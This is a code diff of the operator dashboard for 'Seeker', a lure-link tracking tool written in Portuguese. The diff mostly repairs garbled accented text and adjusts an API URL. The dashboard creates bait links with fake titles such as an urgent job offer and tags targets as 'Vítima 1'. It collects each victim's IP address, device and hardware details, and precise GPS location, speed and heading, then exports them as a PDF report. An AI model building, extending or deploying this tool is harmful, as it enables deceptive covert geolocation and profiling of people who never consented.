@@ -5,21 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Painel de Controle - Seeker</title>
     <style>      
-     
+    
         body { 
             font-family: system-ui, sans-serif; 
             background-color: #f0f2f5; 
             display: flex; 
-            /* MODIFICAÃ‡ÃƒO CHAVE: Remove flex-direction: column e centraliza horizontalmente */
+            /* MODIFICAÇÃO CHAVE: Remove flex-direction: column e centraliza horizontalmente */
             justify-content: center; 
-            align-items: flex-start; /* Alinha no topo para que o conteÃºdo comece junto */
+            align-items: flex-start; /* Alinha no topo para que o conteúdo comece junto */
             min-height: 100vh; 
             margin: 0; 
             padding: 20px; 
-            gap: 20px; /* EspaÃ§o entre as colunas */
+            gap: 20px; /* Espaço entre as colunas */
         }
         
-        /* ContÃªiner principal do Gerador de Link */
+        /* Contêiner principal do Gerador de Link */
         .container { 
             background: white; 
             padding: 2rem 2.5rem; 
@@ -33,7 +33,7 @@
         h1 { text-align: center; color: #1c1e21; margin-top: 0; }
         .form-group { margin-bottom: 1.25rem; }
         label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #333; }
-        input, select, button { width: 100%; padding: 0.8rem; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 1rem; }
+        input, select, button, textarea { width: 100%; padding: 0.8rem; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 1rem; font-family: system-ui, sans-serif; }
         button { background-color: #007bff; color: white; border: none; cursor: pointer; font-weight: 600; transition: background-color 0.2s; }
         button:hover { background-color: #0056b3; }
         button:disabled { background-color: #a0a0a0; cursor: not-allowed; }
@@ -52,10 +52,10 @@
             width: 100%;
             max-width: 800px; 
             min-height: 400px; /* Ajuda a dar uma forma inicial */
-            margin-top: 0; /* Remove margem superior desnecessÃ¡ria */
+            margin-top: 0; /* Remove margem superior desnecessária */
             display: none;
             text-align: left;
-            /* CHAVE: Permite que o display de rastreamento use o espaÃ§o restante */
+            /* CHAVE: Permite que o display de rastreamento use o espaço restante */
             flex-grow: 1; 
         }
 
@@ -92,7 +92,7 @@
             margin-bottom: 10px;
         }
 
-        /* Adiciona responsividade bÃ¡sica para telas pequenas */
+        /* Adiciona responsividade básica para telas pequenas */
         @media (max-width: 1200px) {
             body {
                 flex-direction: column;
@@ -117,12 +117,12 @@
             </select>
         </div>
         <div class="form-group">
-            <label for="groupTitle">TÃ­tulo da Isca:</label>
+            <label for="groupTitle">Título da Isca:</label>
             <input type="text" id="groupTitle" placeholder="Ex: Vaga de Emprego Urgente">
         </div>
         <div class="form-group">
-            <label for="linkDescription">DescriÃ§Ã£o (AnotaÃ§Ãµes):</label>
-            <textarea id="linkDescription" rows="3" placeholder="Ex: VÃ­tima 1, Teste 01/01/2026, Enviado via Telegram."></textarea>
+            <label for="linkDescription">Descrição (Anotações):</label>
+            <textarea id="linkDescription" rows="3" placeholder="Ex: Vítima 1, Teste 01/01/2026, Enviado via Telegram."></textarea>
         </div>
         <div class="form-group">
             <label for="groupImage">Imagem do Grupo (opcional):</label>
@@ -147,24 +147,24 @@
         <button id="export-pdf-btn" style="margin-top: 20px; background-color: #dc3545;" disabled>Exportar como PDF</button>
 
         <div id="description-section" class="data-section" style="display: none;">
-            <div class="status-header" style="color: #6c757d;">DescriÃ§Ã£o da Isca</div>
+            <div class="status-header" style="color: #6c757d;">Descrição da Isca</div>
             <div id="description-data"></div>
         </div>
-               
-        <div id="tracking-status-message" class="status-header">Aguardando geraÃ§Ã£o do link...</div>
+                
+        <div id="tracking-status-message" class="status-header">Aguardando geração do link...</div>
 
         <div id="server-info-section" class="data-section" style="display: none;">
-            <div class="status-header" style="color: #6c757d;">InformaÃ§Ãµes de Rede (Server)</div>
+            <div class="status-header" style="color: #6c757d;">Informações de Rede (Server)</div>
             <div id="server-info-data"></div>
         </div>
 
         <div id="device-info-section" class="data-section" style="display: none;">
-            <div class="status-header" style="color: #007bff;">InformaÃ§Ãµes do Dispositivo (Info)</div>
+            <div class="status-header" style="color: #007bff;">Informações do Dispositivo (Info)</div>
             <div id="device-info-data"></div>
         </div>
 
         <div id="location-section" class="data-section" style="display: none;">
-            <div class="status-header" style="color: #28a745;">LocalizaÃ§Ã£o (Result)</div>
+            <div class="status-header" style="color: #28a745;">Localização (Result)</div>
             <div id="location-data"></div>
         </div>
         
@@ -172,9 +172,9 @@
             <div class="status-header" style="color: #dc3545;">Erro de Rastreamento (Error)</div>
             <div id="error-data"></div>
         </div>
-       
+        
     </div>
-  
+    
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.2/jspdf.plugin.autotable.min.js"></script>
@@ -188,7 +188,7 @@
     const currentTrackingId = document.getElementById('current-tracking-id');
     const trackingStatusMessage = document.getElementById('tracking-status-message');
     
-    // Elementos de exibiÃ§Ã£o de dados
+    // Elementos de exibição de dados
     const deviceSection = document.getElementById('device-info-section');
     const deviceData = document.getElementById('device-info-data');
     const locationSection = document.getElementById('location-section');
@@ -210,7 +210,7 @@
     let activeTrackingId = null;
     let fetchInterval = null;
     
-    // Mapeamento de Chaves para exibiÃ§Ã£o limpa
+    // Mapeamento de Chaves para exibição limpa
     const KEY_MAP = {
         // Server Info
         'clientIp': 'IP',
@@ -218,7 +218,7 @@
         'Ptf': 'Plataforma (Ptf)',
         'Brw': 'Navegador (Brw)',
         'Ven': 'Fabricante GPU',
-        'Cc': 'NÃºcleos CPU (Cc)',
+        'Cc': 'Núcleos CPU (Cc)',
         'Ram': 'RAM (GB)',
         'Ren': 'GPU Renderer',
         'Ht': 'Altura Tela',
@@ -228,9 +228,9 @@
         'Status': 'Status',
         'Lat': 'Latitude',
         'Lon': 'Longitude',
-        'Acc': 'PrecisÃ£o (m)',
+        'Acc': 'Precisão (m)',
         'Alt': 'Altitude',
-        'Dir': 'DireÃ§Ã£o',
+        'Dir': 'Direção',
         'Spd': 'Velocidade',
         'trackingId': 'Tracking ID'
     };
@@ -243,29 +243,29 @@
         setTimeout(() => { copyBtn.textContent = 'Copiar'; }, 2000);
     });
     
-    // FunÃ§Ã£o para renderizar um objeto de dados em HTML formatado (melhor mapeamento)
+    // Função para renderizar um objeto de dados em HTML formatado (melhor mapeamento)
     function renderData(data, targetElement) {
         let html = '';
         
-        // Define a ordem para LocalizaÃ§Ã£o
+        // Define a ordem para Localização
         const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd', 'trackingId'];
 
-        // Ordena chaves para Location, senÃ£o usa a ordem natural
+        // Ordena chaves para Location, senão usa a ordem natural
         const keys = (targetElement.id === 'location-data') 
             ? Object.keys(data).sort((a, b) => locationOrder.indexOf(a) - locationOrder.indexOf(b))
             : Object.keys(data);
 
 
         for (const key of keys) {
-            if (key === 'trackingId') continue; // Evita repetiÃ§Ã£o
+            if (key === 'trackingId') continue; // Evita repetição
 
-            // Mapeia para o nome legÃ­vel, senÃ£o usa o padrÃ£o
+            // Mapeia para o nome legível, senão usa o padrão
             const formattedKey = KEY_MAP[key] || key.replace(/([A-Z])/g, ' $1').trim();
             const displayValue = data[key];
             
             let valueHtml = displayValue;
 
-            // EstilizaÃ§Ã£o especial para IPs longos
+            // Estilização especial para IPs longos
             if (key === 'clientIp' && displayValue.length > 20) {
                  valueHtml = `<span style="word-break: break-all;">${displayValue}</span>`;
             }
@@ -275,7 +275,7 @@
         targetElement.innerHTML = html;
     }
 
-    // FunÃ§Ã£o principal de busca de status de rastreamento
+    // Função principal de busca de status de rastreamento
     async function fetchTrackingStatus() {
         if (!activeTrackingId) return;
 
@@ -295,29 +295,29 @@
             
             const data = await response.json();
             
-            // Reseta a exibiÃ§Ã£o para o ciclo atual
+            // Reseta a exibição para o ciclo atual
             serverSection.style.display = 'none';
             deviceSection.style.display = 'none';
             locationSection.style.display = 'none';
             errorSection.style.display = 'none';
             descriptionSection.style.display = 'none';
 
-            let status = 'Aguardando o recebimento de informaÃ§Ãµes...';
+            let status = 'Aguardando o recebimento de informações...';
 
             if (data.status === 'RECEIVED') {
-                status = 'âœ… InformaÃ§Ãµes recebidas!';
+                status = '✅ Informações recebidas!';
 
-                // Exibe DescriÃ§Ã£o
+                // Exibe Descrição
                 if (data.description) {
                     descriptionSection.style.display = 'block';
-                    // Renderiza o tÃ­tulo da isca e a descriÃ§Ã£o juntos
+                    // Renderiza o título da isca e a descrição juntos
                     descriptionData.innerHTML = `
-                        <div class="data-item"><strong>TÃ­tulo:</strong> ${data.title}</div>
-                        <div class="data-item" style="border-bottom: none;"><strong>AnotaÃ§Ãµes:</strong> ${data.description.replace(/\n/g, '<br>')}</div>
+                        <div class="data-item"><strong>Título:</strong> ${data.title}</div>
+                        <div class="data-item" style="border-bottom: none;"><strong>Anotações:</strong> ${data.description.replace(/\n/g, '<br>')}</div>
                     `;
                 }
 
-                // Exibe InformaÃ§Ãµes do Servidor (IP)
+                // Exibe Informações do Servidor (IP)
                 if (data.clientIp) {
                     serverSection.style.display = 'block';
                     const serverInfo = {};
@@ -325,28 +325,28 @@
                     renderData(serverInfo, serverData);
                 }
                 
-                // Exibe InformaÃ§Ãµes do Dispositivo (Device Info)
+                // Exibe Informações do Dispositivo (Device Info)
                 if (data.info) {
                     deviceSection.style.display = 'block';
                     renderData(data.info, deviceData);
                 }
 
-                // Exibe LocalizaÃ§Ã£o (Location Result)
+                // Exibe Localização (Location Result)
                 if (data.result) {
                     locationSection.style.display = 'block';
                     renderData(data.result, locationData);
-                    status = 'âœ… LocalizaÃ§Ã£o Recebida com Sucesso!';
+                    status = '✅ Localização Recebida com Sucesso!';
                 }
                 
-                // Exibe Erros de LocalizaÃ§Ã£o
+                // Exibe Erros de Localização
                 if (data.error) {
                     errorSection.style.display = 'block';
                     renderData(data.error, errorData);
-                    status = 'âš ï¸ Erro ao obter localizaÃ§Ã£o.';
+                    status = '⚠️ Erro ao obter localização.';
                 }
                 
             } else if (data.status === 'ACTIVE') {
-                 status = 'Aguardando o recebimento de informaÃ§Ãµes...';
+                 status = 'Aguardando o recebimento de informações...';
             }
             
             trackingStatusMessage.textContent = status;
@@ -371,13 +371,13 @@
         // Limpa intervalo anterior se existir
         if (fetchInterval) clearInterval(fetchInterval);
 
-        // GERA O ID ÃšNICO E ATRIBUI Ã€ VARIÃVEL ATIVA
+        // GERA O ID ÚNICO E ATRIBUI À VARIÁVEL ATIVA
         const tracking_id = generateRandomCode(16); 
         activeTrackingId = tracking_id;
         
         // Limpa a tela de rastreamento
         currentTrackingId.textContent = activeTrackingId;
-        trackingStatusMessage.textContent = 'Aguardando geraÃ§Ã£o do link...';
+        trackingStatusMessage.textContent = 'Aguardando geração do link...';
         trackingDisplay.style.display = 'block';
         deviceSection.style.display = 'none';
         locationSection.style.display = 'none';
@@ -388,7 +388,7 @@
         errorData.innerHTML = '';
 
 
-        // EXTRAI A EXTENSÃƒO
+        // EXTRAI A EXTENSÃO
         let fileExtension = '';
         if (imageFile) {
             const fileName = imageFile.name;
@@ -396,7 +396,7 @@
         }
 
         if (!title) {
-            alert('Por favor, insira um tÃ­tulo.');
+            alert('Por favor, insira um título.');
             return;
         }
 
@@ -411,7 +411,7 @@
         generateBtn.disabled = true;
         generateBtn.textContent = 'Gerando...';
         resultContainer.style.display = 'none';
-        statusText.textContent = 'Iniciando serviÃ§os, aguarde...';
+        statusText.textContent = 'Iniciando serviços, aguarde...';
 
         try {
             // CORREÇÃO AQUI: Força a requisição POST para a porta 8888
@@ -423,7 +423,7 @@
             const data = await response.json();
 
             if (data.success) {
-                // A URL final Ã© montada no front-end para incluir o ID
+                // A URL final é montada no front-end para incluir o ID
                 const base_url = data.url; 
                 const final_url = `${base_url}?id=${tracking_id}`; 
 
@@ -439,7 +439,7 @@
                 statusText.textContent = `Erro: ${data.message}`;
             }
         } catch (error) {
-            statusText.textContent = 'Erro de conexÃ£o com o servidor.';
+            statusText.textContent = 'Erro de conexão com o servidor.';
             console.error('Erro:', error);
         } finally {
             generateBtn.disabled = false;
@@ -447,7 +447,7 @@
         }
     });
 
-    // FunÃ§Ã£o separada para gerar cÃ³digo aleatÃ³rio
+    // Função separada para gerar código aleatório
     function generateRandomCode(length = 16) {
         const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
         let result = '';
@@ -457,18 +457,18 @@
         return result;
     }
 
-    // LÃ“GICA DE EXPORTAÃ‡ÃƒO DE PDF (fora da funÃ§Ã£o generateRandomCode)
+    // LÓGICA DE EXPORTAÇÃO DE PDF (fora da função generateRandomCode)
     function objectToTableData(data) {
     const tableData = [];
     const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd', 'trackingId'];
     
-    // Mapeamento de Chaves para exibiÃ§Ã£o limpa (mesmo do renderData)
+    // Mapeamento de Chaves para exibição limpa (mesmo do renderData)
     const KEY_MAP_PDF = {
         'clientIp': 'IP',
         'Ptf': 'Plataforma (Ptf)',
         'Brw': 'Navegador (Brw)',
         'Ven': 'Fabricante GPU',
-        'Cc': 'NÃºcleos CPU (Cc)',
+        'Cc': 'Núcleos CPU (Cc)',
         'Ram': 'RAM (GB)',
         'Ren': 'GPU Renderer',
         'Ht': 'Altura Tela',
@@ -477,16 +477,16 @@
         'Status': 'Status',
         'Lat': 'Latitude',
         'Lon': 'Longitude',
-        'Acc': 'PrecisÃ£o (m)',
+        'Acc': 'Precisão (m)',
         'Alt': 'Altitude',
-        'Dir': 'DireÃ§Ã£o',
+        'Dir': 'Direção',
         'Spd': 'Velocidade',
         'trackingId': 'Tracking ID'
     };
 
     // Filtra e ordena as chaves
     const keys = Object.keys(data).sort((a, b) => {
-        // Prioriza a ordem de LocalizaÃ§Ã£o, senÃ£o ordem alfabÃ©tica
+        // Prioriza a ordem de Localização, senão ordem alfabética
         const indexA = locationOrder.indexOf(a);
         const indexB = locationOrder.indexOf(b);
         if (indexA !== -1 && indexB !== -1) return indexA - indexB;
@@ -500,7 +500,7 @@
         const formattedKey = KEY_MAP_PDF[key] || key.replace(/([A-Z])/g, ' $1').trim();
         let displayValue = String(data[key]);
 
-        // FormataÃ§Ã£o para PDF (ex: IPs longos nÃ£o precisam de span, pois o jsPDF quebra linha automaticamente)
+        // Formatação para PDF (ex: IPs longos não precisam de span, pois o jsPDF quebra linha automaticamente)
         if (key === 'Os') {
             displayValue = displayValue.includes('Windows NT 10.0') ? 'Windows 10/11' : displayValue;
         }
@@ -513,36 +513,36 @@
 
 
     exportPdfBtn.addEventListener('click', () => {
-        // 1. Faz a chamada sÃ­ncrona/imediata ao /api/status para obter os dados brutos
-        fetch(`/api/status?id=${activeTrackingId}`)
+        // 1. Faz a chamada síncrona/imediata ao /api/status para obter os dados brutos
+        fetch(`${API_BASE_URL}/api/status?id=${activeTrackingId}`)
             .then(res => res.json())
             .then(data => {
                 const { jsPDF } = window.jspdf;
                 const doc = new jsPDF('p', 'mm', 'a4'); // 'p'ortrait, 'mm' units, 'a4' size
                 let yOffset = 15;
                 
-                // --- 1. TÃTULO GERAL E ID ---
+                // --- 1. TÍTULO GERAL E ID ---
                 doc.setFontSize(16);
-                doc.text(`RelatÃ³rio de Rastreamento`, 10, yOffset);
+                doc.text(`Relatório de Rastreamento`, 10, yOffset);
                 yOffset += 8;
                 doc.setFontSize(10);
                 doc.text(`Tracking ID: ${activeTrackingId}`, 10, yOffset);
                 yOffset += 10;
 
-                // --- 2. DESCRIÃ‡ÃƒO DA ISCA ---
+                // --- 2. DESCRIÇÃO DA ISCA ---
                 if (data.title || data.description) {
                     doc.setFontSize(12);
-                    doc.text('DescriÃ§Ã£o da Isca', 10, yOffset);
+                    doc.text('Descrição da Isca', 10, yOffset);
                     yOffset += 6;
                     doc.setFontSize(10);
                     
-                    // Exibe o TÃ­tulo
-                    doc.text(`TÃ­tulo: ${data.title || 'N/A'}`, 10, yOffset);
+                    // Exibe o Título
+                    doc.text(`Título: ${data.title || 'N/A'}`, 10, yOffset);
                     yOffset += 6;
                     
-                    // Exibe a DescriÃ§Ã£o/AnotaÃ§Ãµes com quebra de linha
-                    const annotations = data.description || 'Nenhuma anotaÃ§Ã£o fornecida.';
-                    const textLines = doc.splitTextToSize(`AnotaÃ§Ãµes: ${annotations}`, 180); // 180mm de largura
+                    // Exibe a Descrição/Anotações com quebra de linha
+                    const annotations = data.description || 'Nenhuma anotação fornecida.';
+                    const textLines = doc.splitTextToSize(`Anotações: ${annotations}`, 180); // 180mm de largura
                     doc.text(textLines, 10, yOffset);
                     yOffset += (textLines.length * 5) + 5; // Aumenta o offset baseado nas linhas
                 }
@@ -570,11 +570,11 @@
                 });
                 yOffset = doc.autoTable.previous.finalY;
 
-                // --- 4. DADOS DE LOCALIZAÃ‡ÃƒO (TABELA 2) ---
+                // --- 4. DADOS DE LOCALIZAÇÃO (TABELA 2) ---
                 if (data.result || data.error) {
                     yOffset += 10;
                     doc.setFontSize(12);
-                    doc.text('Resultados de GeolocalizaÃ§Ã£o', 10, yOffset);
+                    doc.text('Resultados de Geolocalização', 10, yOffset);
                     yOffset += 2;
 
                     const locationResultStore = data.result || data.error;
@@ -594,7 +594,7 @@
                 doc.save(`Rastreamento_${activeTrackingId}.pdf`);
 
             }).catch(error => {
-                alert('Falha ao buscar dados para exportaÃ§Ã£o PDF: ' + error.message);
+                alert('Falha ao buscar dados para exportação PDF: ' + error.message);
                 console.error('PDF Error:', error);
             });
     });
